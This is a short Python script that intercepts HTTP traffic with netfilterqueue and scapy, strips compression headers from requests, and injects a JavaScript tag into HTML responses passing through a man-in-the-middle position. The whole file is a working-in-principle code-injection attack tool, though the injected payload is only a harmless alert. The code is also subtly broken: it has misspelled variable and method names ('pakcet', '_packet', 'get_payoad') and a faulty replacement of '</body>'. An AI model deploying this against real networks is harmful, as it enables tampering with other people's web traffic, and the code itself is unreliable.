import netfilterqueue
import scapy.all as scapy
import re

def set_load(pakcet, load):
    packet[scapy.Raw].load = load
    #deleting everything that needs to be recalculated
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del _packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payoad())
    if scapy_packet.haslayer(scapy.Raw): #checking if packet has http layer
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80: #identifying request
            print("[+] Request")
            load =re.sub("Accept-Encoding:.*\\r\\n","",load) # removing encoding
            
        elif scapy_packet[scapy.TCP].sport == 80: #identifying response
           print("[+] Response")
           injection_code = "<script>alert('haha');</script>"
           load = load.replace("</body>",injection_code + "<body>")#injecting js code
           content_length_search = re.search("(?:Content-Length:\s)(\d*)", load) # getting the content length of the html code 
           if content_length_search and "text/html" in load: #checking if load contains content length and html code
               content_length = content_length_search.group(1)
               new_content_length = int(content_length) + len(injection_code)
               load = load.replace(content_length, str(new_content_length))
               print(content_length)
               
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet,load)
            packet.set_payload(str(new_packet))
            
            
    packet.accept()

#creating netfilterqueue object to store packets coming from the server to modify them
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
